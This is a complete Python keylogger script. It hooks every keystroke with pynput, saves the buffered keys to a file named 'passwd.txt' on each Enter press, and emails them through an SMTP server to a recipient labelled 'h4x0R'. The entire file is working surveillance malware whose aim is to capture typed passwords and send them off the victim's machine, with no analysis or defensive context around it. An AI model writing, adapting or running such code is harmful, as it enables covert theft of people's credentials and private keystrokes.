import pynput
from pynput.keyboard import Key, Listener
import smtplib


sender = "TKlogg Prey"
receiver = "h4x0R"
keys = []

message = f"""\
Subject: Hi Mailtrap
To: {receiver}
From: {sender}

."""

def writeFile(key):
    with open("passwd.txt", "a") as save:
            save.write(str(key))

def sendMail():
    server = smtplib.SMTP("smtp.mailtrap.io", 2525)
    server.login("mail", "pass")
    server.sendmail(sender, receiver, message + str(keys))

def onPress(key):
    global keys
    keys.append(key)
    print(key)
    if key == Key.enter:
        writeFile(keys)
        sendMail()
        keys = []
        
def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press = onPress, on_release = onRelease) as listener:
    listener.join()